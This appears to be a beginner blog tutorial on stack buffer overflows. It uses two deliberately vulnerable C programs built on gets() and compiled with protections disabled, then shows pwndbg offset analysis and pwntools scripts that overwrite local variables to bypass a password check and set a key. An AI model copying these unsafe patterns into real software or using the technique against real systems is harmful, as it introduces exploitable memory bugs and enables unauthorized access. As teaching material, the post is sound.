---
author: pl4int3xt
layout: post
title: Buffer overfl0w 01 - overwrite stack variables
date: '2024-01-05'
# cover: img/cover_images/50.png
description: "Learn how to overwrite variables in the stack buffer overflow"
categories: [Binary Exploitation 101]
tags: [Buffer overflow, binary exploitation]
---

## Understanding buffer overflow
Buffer overflow occurs when a running program tries to write data outside the memory buffer. A buffer is temporary storage usually present in the physical memory used to hold data. A buffer overflow may lead a program to crash or execute other malicious code.

## Let's take a look of a basic authetication program.

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
    char password[6];
    int authorised = 0;

    printf("Enter admin password: \n");
    gets(password);

    if(strcmp(password, "pass") == 0){
        printf("Correct Password!\n");
        authorised = 1;
    } else {
        printf("Incorrect Password!\n");
    }

    if(authorised) {
        printf("Successfully logged in as Admin (authorised=%d) :)\n", authorised);
    }else{
		printf("Failed to log in as Admin (authorised=%d) :(\n", authorised);
	}

    return 0;
}
```

Let's compile the code to an executable binary and remove the protections which might prevent us from exploiting the code. The code is dynamically linked and its not stripped.

```shell
gcc login.c -o login -fno-stack-protector -z execstack -no-pie
```
We enter a random password and we get incorrect password and we failed to login as Admin
```shell
~/Documents/coding/c$ ./login
Enter admin password: 
12313
Incorrect Password!
Failed to log in as Admin (authorised=0) :(
```

## overwriting local variables in the stack
Let's try entering a long random data and see what's happens
```shell
~/Documents/coding/c$ ./login
Enter admin password: 
abcdefg
Incorrect Password!
Successfully logged in as Admin (authorised=103) :)
```
We successfully logged in with a wrong password.The authorised variable is set to 103  which is the decimal value of the ascii character g. Our character from the code should only hold a maximum of 6 characters.

```c
char password[6];
```

Since we are using a dangerous method `gets()` it does not check whether the user input will fit inside the 6 byte `char[]`. Since the authorised variable is below the password array in the stack it will be the one that will be overwritten first after the buffer of 6 characters if filled. 
```c
char password[6];
int authorised = 0;
```
The if condition checks if authorised is not equal to zero and since it was overwritten to 103 it will return true and hence we will log in successfully without the correct password
```c
if(authorised) {
    printf("Successfully logged in as Admin (authorised=%d) :)\n", authorised);
}else{
	printf("Failed to log in as Admin (authorised=%d) :(\n", authorised);
}
```
Let's try using a pwn script to exploit this code
```python
from pwn import *

# execute the program locally
io = process('./login')

# debug the program and see whats being send and received 
context.log_level = "debug"

# send our string to overflow the buffer after the last colon Enter admin password:
io.sendlineafter(b':', b'abcdefg')

# Receive the output from the program
print(io.recvall().decode())

```
Let's run the script and automatically exploit the buffer overflow
```shell
~/Documents/coding/c$ python3 buffer.py
[+] Starting local process './login': pid 33611
[DEBUG] Received 0x17 bytes:
    b'Enter admin password: \n'
[DEBUG] Sent 0x8 bytes:
    b'abcdefg\n'
[+] Receiving all data: Done (74B)
[*] Process './login' stopped with exit code 0 (pid 33611)
[DEBUG] Received 0x48 bytes:
    b'Incorrect Password!\n'
    b'Successfully logged in as Admin (authorised=103) :)\n'
 
Incorrect Password!
Successfully logged in as Admin (authorised=103) :)
```
We can see we successfully logged in as Admin. The pwntools will come in handy when exploiting binaries running remotely which will happen in most cases during pwn challenges.

## Overwriting more complicated variables in the stack 

Let's take a look at this more complicated code in c

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void do_input(){
    int key = 0x12345678;
    char buffer[32];
    printf("I heard you are the best lock picker in the town ? ");
    fflush(stdout);
    gets(buffer);
    if(key == 0xdeadbeef){
        printf("good job!!\n");
        printf("%04x\n", key);
        fflush(stdout);
    }
    else{
        printf("%04x\n", key);
        printf("...\n");
        fflush(stdout);
    }
}

int main(int argc, char* argv[]){
    do_input();
    return 0;
}
```

it checks if the value of `key == 0xdeadbeef` to print good job. The key is initial set to `0x12345678`. We need to overwrite the value of key and change it to bypass it.

Let's compile the code 

```shell
gcc lockpicker.c -o lockpicker -fno-stack-protector -no-pie
```

Let's run the code with pwndbg and disassemble do_input function

```shell
pwndbg> disassemble do_input
Dump of assembler code for function do_input:
   0x0000000000401156 <+0>:	push   rbp
   0x0000000000401157 <+1>:	mov    rbp,rsp
   0x000000000040115a <+4>:	sub    rsp,0x30
   0x000000000040115e <+8>:	mov    DWORD PTR [rbp-0x4],0x12345678
   0x0000000000401165 <+15>:	lea    rax,[rip+0xe9c]        # 0x402008
   0x000000000040116c <+22>:	mov    rdi,rax
   0x000000000040116f <+25>:	mov    eax,0x0
   0x0000000000401174 <+30>:	call   0x401040 <printf@plt>
   0x0000000000401179 <+35>:	mov    rax,QWORD PTR [rip+0x2eb0]        # 0x404030 <stdout@GLIBC_2.2.5>
   0x0000000000401180 <+42>:	mov    rdi,rax
   0x0000000000401183 <+45>:	call   0x401060 <fflush@plt>
   0x0000000000401188 <+50>:	lea    rax,[rbp-0x30]
   0x000000000040118c <+54>:	mov    rdi,rax
   0x000000000040118f <+57>:	mov    eax,0x0
   0x0000000000401194 <+62>:	call   0x401050 <gets@plt>
   0x0000000000401199 <+67>:	cmp    DWORD PTR [rbp-0x4],0xdeadbeef
   0x00000000004011a0 <+74>:	jne    0x4011db <do_input+133>
   0x00000000004011a2 <+76>:	lea    rax,[rip+0xe93]        # 0x40203c
   0x00000000004011a9 <+83>:	mov    rdi,rax
   0x00000000004011ac <+86>:	call   0x401030 <puts@plt>
   0x00000000004011b1 <+91>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004011b4 <+94>:	mov    esi,eax
   0x00000000004011b6 <+96>:	lea    rax,[rip+0xe8a]        # 0x402047
   0x00000000004011bd <+103>:	mov    rdi,rax
   0x00000000004011c0 <+106>:	mov    eax,0x0
   0x00000000004011c5 <+111>:	call   0x401040 <printf@plt>
   0x00000000004011ca <+116>:	mov    rax,QWORD PTR [rip+0x2e5f]        # 0x404030 <stdout@GLIBC_2.2.5>
   0x00000000004011d1 <+123>:	mov    rdi,rax
   0x00000000004011d4 <+126>:	call   0x401060 <fflush@plt>
   0x00000000004011d9 <+131>:	jmp    0x401212 <do_input+188>
   0x00000000004011db <+133>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004011de <+136>:	mov    esi,eax
   0x00000000004011e0 <+138>:	lea    rax,[rip+0xe60]        # 0x402047
   0x00000000004011e7 <+145>:	mov    rdi,rax
   0x00000000004011ea <+148>:	mov    eax,0x0
   0x00000000004011ef <+153>:	call   0x401040 <printf@plt>
   0x00000000004011f4 <+158>:	lea    rax,[rip+0xe52]        # 0x40204d
   0x00000000004011fb <+165>:	mov    rdi,rax
   0x00000000004011fe <+168>:	call   0x401030 <puts@plt>
   0x0000000000401203 <+173>:	mov    rax,QWORD PTR [rip+0x2e26]        # 0x404030 <stdout@GLIBC_2.2.5>
   0x000000000040120a <+180>:	mov    rdi,rax
   0x000000000040120d <+183>:	call   0x401060 <fflush@plt>
   0x0000000000401212 <+188>:	nop
   0x0000000000401213 <+189>:	leave
   0x0000000000401214 <+190>:	ret
End of assembler dump.
```

We find the comparison at `0x0000000000401199 <+67>:	cmp    DWORD PTR [rbp-0x4],0xdeadbeef` so we then set a breakpoint at that address and use cyclic to crash the binary

```shell
pwndbg> cyclic 50
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
pwndbg> b *0x0000000000401199
Note: breakpoint 1 also set at pc 0x401199.
Breakpoint 2 at 0x401199
pwndbg> run
Starting program: /home/pl4int3xt/Documents/pwn/shellcode/lockpicker 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
I heard you are the best lock picker in the town ? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga

Breakpoint 1, 0x0000000000401199 in do_input ()
```

Let's check the values in `rbp-4` and use cyclic to get the offset

```shell
pwndbg> x/s $rbp-4
0x7fffffffe63c:	"aaaaga"
pwndbg> cyclic -l aaaagaaa
Finding cyclic pattern of 8 bytes: b'aaaagaaa' (hex: 0x6161616167616161)
Found at offset 44
```

Let's create a python script to overwrite the `rbp-4` register with our desired value in the little endian byte order

```python
from pwn import *
from struct import *

# Start program
io = process('./lockpicker')

padding = 44

rbp_4 = pack("<I", 0xdeadbeef)

payload = flat(
    asm('nop') * padding,
    rbp_4
)

write('payload', payload)
# Send string to overflow buffer
io.sendlineafter(b'?', payload)

# Receive output
print(io.recvall().decode())
```

Let's run the script to overwrite the variable

```shell
pl4int3xt@archlinux ~/D/p/shellcode [1]> python3 lockpicker.py
[+] Starting local process './lockpicker': pid 25981
[+] Receiving all data: Done (21B)
[*] Process './lockpicker' stopped with exit code -11 (SIGSEGV) (pid 25981)
 good job!!
deadbeef
```